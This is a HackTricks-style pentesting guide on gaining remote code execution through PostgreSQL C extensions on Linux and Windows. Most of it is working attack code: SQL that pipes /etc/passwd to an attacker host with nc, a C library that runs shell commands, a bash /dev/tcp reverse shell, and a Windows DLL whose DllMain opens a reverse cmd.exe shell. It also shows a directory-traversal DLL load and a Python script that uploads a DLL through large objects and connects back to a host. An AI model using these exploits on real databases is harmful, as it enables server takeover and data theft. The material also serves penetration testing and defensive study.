# RCE with PostgreSQL Extensions

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## PostgreSQL Extensions

PostgreSQL is designed to be easily extensible. For this reason, extensions loaded into the database can function just like features that are built in.\
Extensions are modules that supply extra functions, operators, or types. They are libraries written in C.\
From PostgreSQL > 8.1 the extension libraries must be compiled with a especial header or PostgreSQL will refuse to execute them.

Also, keep in mind that **if you don't know how to** [**upload files to the victim abusing PostgreSQL you should read this post.**](big-binary-files-upload-postgresql.md)

### RCE in Linux

The process for executing system commands from PostgreSQL 8.1 and before is straightforward and well documented ([Metasploit module](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres\_payload)):

```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```

<details>

<summary>Write binary file from base64</summary>

To write a binary into a file in postgres you might need to use base64, this will be helpful for that matter:

```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
    $$
    DECLARE
        fh int;
        s int;
        w bytea;
        i int;
    BEGIN
        SELECT open(textout(file)::cstring, 522, 448) INTO fh;

        IF fh <= 2 THEN
            RETURN 1;
        END IF;

        SELECT decode(s, 'base64') INTO w;

        i := 0;
        LOOP
            EXIT WHEN i >= octet_length(w);

            SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

            IF rs < 0 THEN
                RETURN 2;
            END IF;

            i := i + 1;
        END LOOP;

        SELECT close(fh) INTO rs;

        RETURN 0;

    END;
    $$ LANGUAGE 'plpgsql';
```

</details>

However, when attempted on PostgreSQL 9.0, **the following error was shown**:

```c
ERROR:  incompatible library “/lib/x86_64-linux-gnu/libc.so.6”: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```

This error is explained in the [PostgreSQL documentation](https://www.postgresql.org/docs/current/static/xfunc-c.html):

> To ensure that a dynamically loaded object file is not loaded into an incompatible server, PostgreSQL checks that the file contains a “magic block” with the appropriate contents. This allows the server to detect obvious incompatibilities, such as code compiled for a different major version of PostgreSQL. A magic block is required as of PostgreSQL 8.2. To include a magic block, write this in one (and only one) of the module source files, after having included the header fmgr.h:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

So for PostgreSQL versions since 8.2, an attacker either needs to take advantage of a library already present on the system, or upload their own library, which has been compiled against the right major version of PostgreSQL, and includes this magic block.

#### Compile the library

First of all you need to know the version of PostgreSQL running:

```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```

The major versions have to match, so in this case compiling a library using any 9.6.x should work.\
Then install that version in your system:

```bash
apt install postgresql postgresql-server-dev-9.6
```

And compile the library:

```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
    char* command = PG_GETARG_CSTRING(0);
    PG_RETURN_INT32(system(command));
}
```

Then upload the compiled library and execute commands with:

```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```

You can find this **library precompiled** to several different PostgreSQL versions and even can **automate this process** (if you have PostgreSQL access) with:

{% embed url="https://github.com/Dionach/pgexec" %}

For more information read: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)

### RCE in Windows

The following DLL takes as input the **name of the binary** and the **number** of **times** you want to execute it and executes it:

```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
	/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	/* retrieve the second argument that is passed to the function (an integer)
	that will serve as our counter limit*/

	int instances = PG_GETARG_INT32(1);

	for (int c = 0; c < instances; c++) {
		/*launch the process passed in the first parameter*/
		ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
	}
	PG_RETURN_VOID();
}
```

You can find the DLL compiled in this zip:

{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}

You can indicate to this DLL **which binary to execute** and the number of time to execute it, in this example it will execute `calc.exe` 2 times:

```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```

In [**here** ](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html)you can find this reverse-shell:

```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"
 
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>
 
#pragma comment(lib,"ws2_32")
 
#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif
 
#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
                    _In_ DWORD fdwReason,
                    _In_ LPVOID lpvReserved)
{
    WSADATA wsaData;
    SOCKET wsock;
    struct sockaddr_in server;
    char ip_addr[16];
    STARTUPINFOA startupinfo;
    PROCESS_INFORMATION processinfo;
 
    char *program = "cmd.exe";
    const char *ip = PG_REVSHELL_CALLHOME_SERVER;
    u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);
 
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    wsock = WSASocket(AF_INET, SOCK_STREAM,
                      IPPROTO_TCP, NULL, 0, 0);
 
    struct hostent *host;
    host = gethostbyname(ip);
    strcpy_s(ip_addr, sizeof(ip_addr),
             inet_ntoa(*((struct in_addr *)host->h_addr)));
 
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip_addr);
 
    WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
              NULL, NULL, NULL, NULL);
 
    memset(&startupinfo, 0, sizeof(startupinfo));
    startupinfo.cb = sizeof(startupinfo);
    startupinfo.dwFlags = STARTF_USESTDHANDLES;
    startupinfo.hStdInput = startupinfo.hStdOutput =
                            startupinfo.hStdError = (HANDLE)wsock;
 
    CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
                  NULL, NULL, &startupinfo, &processinfo);
 
    return TRUE;
}
 
#pragma warning(pop) /* re-enable 4996 */
 
/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);
 
PG_FUNCTION_INFO_V1(add_one);
 
Datum dummy_function(PG_FUNCTION_ARGS)
{
    int32 arg = PG_GETARG_INT32(0);
 
    PG_RETURN_INT32(arg + 1);
}
```

Note how in this case the **malicious code is inside the DllMain function**. This means that in this case it isn't necessary to execute the loaded function in postgresql, just **loading the DLL** will **execute** the reverse shell:

```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```

### RCE in newest Prostgres versions

On the **latest versions** of PostgreSQL, the `superuser` is **no** longer **allowed** to **load** a shared library file from **anywhere** else besides `C:\Program Files\PostgreSQL\11\lib` on Windows or `/var/lib/postgresql/11/lib` on \*nix. Additionally, this path is **not writable** by either the NETWORK\_SERVICE or postgres accounts.

However, an authenticated database `superuser` **can write** binary files to the file-system using “large objects” and can of course write to the `C:\Program Files\PostgreSQL\11\data` directory. The reason for this should be clear, for updating/creating tables in the database.

The underlying issue is that the `CREATE FUNCTION` operative **allows for a directory traversal** to the data directory! So essentially, an authenticated attacker can **write a shared library file into the data directory and use the traversal to load the shared library**. This means an attacker can get native code execution and as such, execute arbitrary code.

#### Attack flow

First of all you need to **use large objects to upload the dll**. You can see how to do that here:

{% content-ref url="big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

Once you have uploaded the extension (with the name of poc.dll for this example) to the data directory you can load it with:

```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```

_Note that you don't need to append the `.dll` extension as the create function will add it._

For more information **read the**[ **original publication here**](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
In that publication **this was the** [**code use to generate the postgres extension**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_to learn how to compile a postgres extension read any of the previous versions_).\
In the same page this **exploit to automate** this technique was given:

```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
    print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
    print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
    d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
    start = i * 2048
    end   = (i+1) * 2048
    if i == 0:
        sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
    else:
        sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
    end   = (i+1) * 2048
    sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
    sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```

## References

* [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
